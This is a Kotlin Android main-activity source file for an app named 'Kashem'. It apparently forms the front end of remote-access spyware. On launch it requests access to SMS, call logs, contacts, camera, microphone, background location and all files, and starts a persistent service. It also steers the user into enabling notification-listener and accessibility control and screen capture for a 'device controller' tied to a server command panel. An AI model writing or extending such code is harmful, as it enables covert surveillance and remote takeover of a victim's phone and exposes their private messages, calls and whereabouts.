package com.kashem.shaikh

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.kashem.shaikh.services.AppLogs
import com.kashem.shaikh.services.ForegroundService
import com.kashem.shaikh.services.NotificationListener
import com.kashem.shaikh.streaming.DeviceControlService
import com.kashem.shaikh.streaming.DeviceController
import com.kashem.shaikh.ui.theme.KashemTheme

class MainActivity : ComponentActivity() {

    private val PERMISSION_REQUEST = 100
    private val BACKGROUND_LOCATION_REQUEST = 101
    private val MANAGE_STORAGE_REQUEST = 102

    private var permissionState by mutableStateOf<Map<String, Boolean>>(emptyMap())

    private val mediaProjectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        try {
            AppLogs.info("MainActivity: MediaProjection result – code=${result.resultCode}, hasData=${result.data != null}")
            if (result.resultCode == RESULT_OK && result.data != null) {
                val status = DeviceController.startWithPermission(
                    applicationContext, result.resultCode, result.data
                )
                AppLogs.info("MainActivity: DeviceController → $status")
            } else {
                AppLogs.warn("MainActivity: MediaProjection denied (code=${result.resultCode})")
            }
        } catch (e: Throwable) {
            AppLogs.error("MainActivity: MediaProjection handler failed", e)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Step 1: Edge-to-edge
        try {
            enableEdgeToEdge()
        } catch (e: Throwable) {
            Log.e("Kashem", "enableEdgeToEdge failed", e)
        }

        // Step 2: AppLogs
        try { AppLogs.init(applicationContext) } catch (_: Throwable) {}
        AppLogs.logService("MainActivity.onCreate: START")

        // Step 3: Compose content (the crash culprit area)
        try {
            setContent {
                KashemTheme {
                    Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                        KashemScreen(
                            permissionState = permissionState,
                            modifier = Modifier.padding(innerPadding),
                            onRequestPermissions = { safeRun("requestPermissions") { requestPermissions() } },
                            onOpenNotifSettings = { safeRun("openNotifSettings") { openNotificationSettings() } },
                            onOpenAccessibilitySettings = { safeRun("openA11y") { openAccessibilitySettings() } },
                            onRequestMediaProjection = { safeRun("reqMediaProjection") { requestMediaProjection() } },
                            onOpenAppSettings = { safeRun("openAppSettings") { openAppSettings() } }
                        )
                    }
                }
            }
            AppLogs.logService("MainActivity.onCreate: setContent returned")
        } catch (e: Throwable) {
            AppLogs.error("MainActivity.onCreate: setContent threw", e)
            Log.e("Kashem", "setContent threw", e)
        }

        // Step 4: Request permissions
        safeRun("requestPermissions") { requestPermissions() }

        // Step 5: Start FGS
        safeRun("startFGS") { startForegroundServiceNow() }

        // Step 6: Intent
        try {
            intent?.let {
                if (it.getBooleanExtra("request_device_controller", false)) {
                    AppLogs.info("MainActivity: Controller requested via onCreate intent")
                    requestMediaProjection()
                }
            }
        } catch (e: Throwable) {
            AppLogs.error("MainActivity: intent handling failed", e)
        }

        // Step 7: Refresh state
        safeRun("refreshPermissionState") { refreshPermissionState() }

        AppLogs.logService("MainActivity.onCreate: END")
    }

    private inline fun safeRun(name: String, block: () -> Unit) {
        try { block() }
        catch (e: Throwable) {
            AppLogs.error("MainActivity: $name failed", e)
            Log.e("Kashem", "$name failed", e)
        }
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        try {
            setIntent(intent)
            if (intent?.getBooleanExtra("request_device_controller", false) == true) {
                requestMediaProjection()
            }
        } catch (e: Throwable) {
            AppLogs.error("onNewIntent failed", e)
        }
    }

    override fun onResume() {
        super.onResume()
        safeRun("onResume.refreshPermissionState") { refreshPermissionState() }
    }

    // ✅ FIX: প্রতিটি check আলাদা try-catch-এ — কোনো একটা fail হলেও অন্যগুলো কাজ করবে
    private fun refreshPermissionState() {
        try {
            val state = mutableMapOf<String, Boolean>()

            state["Notifications"] = try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                    checkSelfPerm(Manifest.permission.POST_NOTIFICATIONS) else true
            } catch (_: Throwable) { false }

            state["Contacts"] = try { checkSelfPerm(Manifest.permission.READ_CONTACTS) } catch (_: Throwable) { false }
            state["Call Log"] = try { checkSelfPerm(Manifest.permission.READ_CALL_LOG) } catch (_: Throwable) { false }
            state["SMS"] = try { checkSelfPerm(Manifest.permission.READ_SMS) } catch (_: Throwable) { false }
            state["Phone"] = try { checkSelfPerm(Manifest.permission.CALL_PHONE) } catch (_: Throwable) { false }
            state["Camera"] = try { checkSelfPerm(Manifest.permission.CAMERA) } catch (_: Throwable) { false }
            state["Microphone"] = try { checkSelfPerm(Manifest.permission.RECORD_AUDIO) } catch (_: Throwable) { false }
            state["Location"] = try { checkSelfPerm(Manifest.permission.ACCESS_FINE_LOCATION) } catch (_: Throwable) { false }
            state["Background Location"] = try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    checkSelfPerm(Manifest.permission.ACCESS_BACKGROUND_LOCATION) else true
            } catch (_: Throwable) { false }

            state["All Files Access"] = try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
                    Environment.isExternalStorageManager() else true
            } catch (_: Throwable) { false }

            state["Notification Access"] = try {
                NotificationListener.isPermissionGranted(this@MainActivity)
            } catch (_: Throwable) { false }

            state["Accessibility"] = try {
                DeviceControlService.isEnabled()
            } catch (_: Throwable) { false }

            permissionState = state
        } catch (e: Throwable) {
            AppLogs.error("refreshPermissionState failed", e)
        }
    }

    private fun checkSelfPerm(p: String): Boolean = try {
        ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
    } catch (_: Throwable) { false }

    private fun startForegroundServiceNow() {
        val intent = Intent(this, ForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        AppLogs.logService("MainActivity started ForegroundService")
    }

    private fun requestMediaProjection() {
        try {
            val pm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjectionLauncher.launch(pm.createScreenCaptureIntent())
            AppLogs.info("MediaProjection: dialog launched")
        } catch (e: Throwable) {
            AppLogs.error("requestMediaProjection failed", e)
        }
    }

    private fun openNotificationSettings() {
        try {
            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
        } catch (e: Throwable) {
            AppLogs.warn("openNotificationSettings failed: ${e.message}")
        }
    }

    private fun openAccessibilitySettings() {
        try {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        } catch (e: Throwable) {
            AppLogs.warn("openAccessibilitySettings failed: ${e.message}")
        }
    }

    private fun openAppSettings() {
        try {
            startActivity(
                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    .setData(Uri.parse("package:$packageName"))
            )
        } catch (_: Throwable) {}
    }

    private fun requestPermissions() {
        try {
            val perms = mutableListOf<String>()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                !checkSelfPerm(Manifest.permission.POST_NOTIFICATIONS))
                perms.add(Manifest.permission.POST_NOTIFICATIONS)

            if (!checkSelfPerm(Manifest.permission.READ_CONTACTS))
                perms.add(Manifest.permission.READ_CONTACTS)
            if (!checkSelfPerm(Manifest.permission.WRITE_CONTACTS))
                perms.add(Manifest.permission.WRITE_CONTACTS)
            if (!checkSelfPerm(Manifest.permission.READ_CALL_LOG))
                perms.add(Manifest.permission.READ_CALL_LOG)
            if (!checkSelfPerm(Manifest.permission.READ_SMS))
                perms.add(Manifest.permission.READ_SMS)
            if (!checkSelfPerm(Manifest.permission.SEND_SMS))
                perms.add(Manifest.permission.SEND_SMS)
            if (!checkSelfPerm(Manifest.permission.RECEIVE_SMS))
                perms.add(Manifest.permission.RECEIVE_SMS)
            if (!checkSelfPerm(Manifest.permission.CALL_PHONE))
                perms.add(Manifest.permission.CALL_PHONE)
            if (!checkSelfPerm(Manifest.permission.READ_PHONE_STATE))
                perms.add(Manifest.permission.READ_PHONE_STATE)
            if (!checkSelfPerm(Manifest.permission.ANSWER_PHONE_CALLS))
                perms.add(Manifest.permission.ANSWER_PHONE_CALLS)
            if (!checkSelfPerm(Manifest.permission.CAMERA))
                perms.add(Manifest.permission.CAMERA)
            if (!checkSelfPerm(Manifest.permission.RECORD_AUDIO))
                perms.add(Manifest.permission.RECORD_AUDIO)
            if (!checkSelfPerm(Manifest.permission.ACCESS_FINE_LOCATION))
                perms.add(Manifest.permission.ACCESS_FINE_LOCATION)
            if (!checkSelfPerm(Manifest.permission.ACCESS_COARSE_LOCATION))
                perms.add(Manifest.permission.ACCESS_COARSE_LOCATION)

            if (perms.isNotEmpty()) {
                AppLogs.info("MainActivity: requesting ${perms.size} permissions")
                ActivityCompat.requestPermissions(this, perms.toTypedArray(), PERMISSION_REQUEST)
            } else {
                requestBackgroundLocation()
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val needsAllFiles = try { !Environment.isExternalStorageManager() } catch (_: Throwable) { false }
                if (needsAllFiles) {
                    try {
                        startActivityForResult(
                            Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                                .setData(Uri.parse("package:$packageName")),
                            MANAGE_STORAGE_REQUEST
                        )
                    } catch (_: Throwable) {
                        try {
                            startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                        } catch (_: Throwable) {}
                    }
                }
            }
        } catch (e: Throwable) {
            AppLogs.error("requestPermissions failed", e)
        }
    }

    private fun requestBackgroundLocation() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                !checkSelfPerm(Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                    BACKGROUND_LOCATION_REQUEST
                )
            }
        } catch (e: Throwable) {
            AppLogs.error("requestBackgroundLocation failed", e)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        try {
            for (i in permissions.indices) {
                val granted = grantResults.getOrNull(i) == PackageManager.PERMISSION_GRANTED
                AppLogs.logPermission(permissions[i], granted)
            }
        } catch (_: Throwable) {}
        if (requestCode == PERMISSION_REQUEST) {
            safeRun("onPermResult.requestBackgroundLocation") { requestBackgroundLocation() }
        }
        safeRun("onPermResult.refresh") { refreshPermissionState() }
    }
}

// ═══════════════════════════════════════════════════════════
//  Composable — unchanged
// ═══════════════════════════════════════════════════════════

@Composable
fun KashemScreen(
    permissionState: Map<String, Boolean>,
    modifier: Modifier = Modifier,
    onRequestPermissions: () -> Unit,
    onOpenNotifSettings: () -> Unit,
    onOpenAccessibilitySettings: () -> Unit,
    onRequestMediaProjection: () -> Unit,
    onOpenAppSettings: () -> Unit
) {
    Surface(modifier = modifier.fillMaxSize()) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .padding(20.dp),
            verticalArrangement = Arrangement.spacedBy(10.dp)
        ) {
            Text(
                text = "Kashem Service Running",
                fontSize = 20.sp,
                fontWeight = FontWeight.Bold,
                color = MaterialTheme.colorScheme.primary
            )
            Text(
                text = "চেক করুন notification অথবা সার্ভার কমান্ড প্যানেল",
                fontSize = 14.sp
            )

            Spacer(Modifier.height(8.dp))

            Card(
                colors = CardDefaults.cardColors(
                    containerColor = MaterialTheme.colorScheme.surfaceVariant
                ),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                    Text("Permissions", fontWeight = FontWeight.SemiBold, fontSize = 15.sp)
                    if (permissionState.isEmpty()) {
                        Text("Loading…", fontSize = 13.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
                    } else {
                        permissionState.forEach { (name, granted) ->
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Text(name, fontSize = 13.sp)
                                Text(
                                    text = if (granted) "✓ Granted" else "✗ Denied",
                                    fontSize = 12.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = if (granted)
                                        MaterialTheme.colorScheme.primary
                                    else MaterialTheme.colorScheme.error
                                )
                            }
                        }
                    }
                }
            }

            Spacer(Modifier.height(4.dp))
            Text("Actions", fontWeight = FontWeight.SemiBold, fontSize = 15.sp)

            Button(
                onClick = onOpenNotifSettings,
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(8.dp)
            ) { Text("🔔 Open Notification Access") }

            Button(
                onClick = onOpenAccessibilitySettings,
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(8.dp)
            ) { Text("♿ Open Accessibility Settings") }

            Button(
                onClick = onRequestMediaProjection,
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(8.dp)
            ) { Text("🎮 Grant Screen Capture (Controller)") }

            OutlinedButton(
                onClick = onRequestPermissions,
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(8.dp)
            ) { Text("🔐 Re-request Permissions") }

            OutlinedButton(
                onClick = onOpenAppSettings,
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(8.dp)
            ) { Text("⚙️ App Settings") }

            Spacer(Modifier.height(10.dp))
            Text(
                "📄 Logs: Download/AppLogs/AppLogs.txt",
                fontSize = 11.sp,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )
        }
    }
}